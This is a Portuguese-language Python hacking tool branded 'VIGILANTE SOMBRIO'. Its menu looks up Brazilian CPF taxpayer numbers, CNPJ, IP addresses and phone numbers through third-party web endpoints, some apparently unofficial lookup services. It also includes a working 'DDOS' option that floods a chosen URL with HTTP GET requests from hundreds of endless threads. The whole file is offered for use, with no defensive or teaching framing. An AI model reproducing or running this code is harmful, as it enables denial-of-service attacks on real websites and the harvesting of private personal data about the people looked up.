import os
import time
import requests
import json
import threading

VERMELHO = '\033[91m'
RESET = '\033[0m'
VERDE = '\033[92m'

def banner():
    os.system("clear")
    print(VERMELHO + """
  VIGILANTE SOMBRIO

VIGILANTE SOMBRIO BY: GhostKernel
""" + RESET)

def consultar_cpf(cpf):
    url = "https://encomendasdobrasil.com/api.php"
    payload = {'cpf': cpf}
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print(VERMELHO + "Resultado da consulta CPF:\n" + RESET)
            print(response.text)
        else:
            print(VERMELHO + f"Erro na consulta. Status: {response.status_code}" + RESET)
    except Exception as e:
        print(VERMELHO + f"Erro na requisição: {e}" + RESET)

def consultar_cnpj(cnpj):
    url = f"https://receitaws.com.br/v1/cnpj/{cnpj}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            print(VERMELHO + "Resultado da consulta CNPJ:\n" + RESET)
            print(json.dumps(data, indent=4, ensure_ascii=False))
        else:
            print(VERMELHO + f"Erro na consulta. Status: {response.status_code}" + RESET)
    except Exception as e:
        print(VERMELHO + f"Erro na requisição: {e}" + RESET)

def consultar_ip(ip):
    url = "https://exemploapi.com/ip"
    payload = {'ip': ip}
    try:
        response = requests.post(url, data=payload)
        if response.status_code == 200:
            print(VERMELHO + "Resultado da consulta IP:\n" + RESET)
            print(response.text)
        else:
            print(VERMELHO + f"Erro na consulta. Status: {response.status_code}" + RESET)
    except Exception as e:
        print(VERMELHO + f"Erro na requisição: {e}" + RESET)

def consultar_telefone(numero):
    url = f"https://api-jrizz-c2.ct.ws/consulta.php?numero={numero}&i=1"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print(VERMELHO + "Resultado da consulta Telefone:\n" + RESET)
            print(response.text)
        else:
            print(VERMELHO + f"Erro na consulta. Status: {response.status_code}" + RESET)
    except Exception as e:
        print(VERMELHO + f"Erro na requisição: {e}" + RESET)

def ddos_http_get():
    url = input(VERMELHO + "Digite a URL (com http ou https): " + RESET)
    threads = int(input(VERMELHO + "Quantidade de Threads (Ex: 100 ou 500): " + RESET))

    def attack():
        while True:
            try:
                response = requests.get(url, timeout=5)
                print(f"{VERDE}[+] ATACANDO -> {url} | Status: {response.status_code}{RESET}")
            except:
                print(f"{VERMELHO}[-] ERRO -> Servidor caiu ou erro na conexão{RESET}")

    for _ in range(threads):
        th = threading.Thread(target=attack)
        th.start()

def menu():
    print(VERMELHO + "[1] Consultar CPF")
    print("[2] Consultar CNPJ")
    print("[3] Consultar IP")
    print("[4] Consultar Telefone")
    print("[5] DDOS ")
    print("[0] Sair" + RESET)
    escolha = input(VERMELHO + "Escolha uma opção: " + RESET)

    if escolha == "1":
        consultar_cpf(input("CPF: "))
    elif escolha == "2":
        consultar_cnpj(input("CNPJ: "))
    elif escolha == "3":
        consultar_ip(input("IP: "))
    elif escolha == "4":
        consultar_telefone(input("Telefone: "))
    elif escolha == "5":
        ddos_http_get()
    elif escolha == "0":
        print(VERMELHO + "Saindo..." + RESET)
        time.sleep(1)
        exit()
    else:
        print(VERMELHO + "Opção inválida." + RESET)

    input(VERMELHO + "\nPressione Enter para voltar ao menu..." + RESET)
    main()

def main():
    banner()
    menu()

if __name__ == "__main__":
    main()
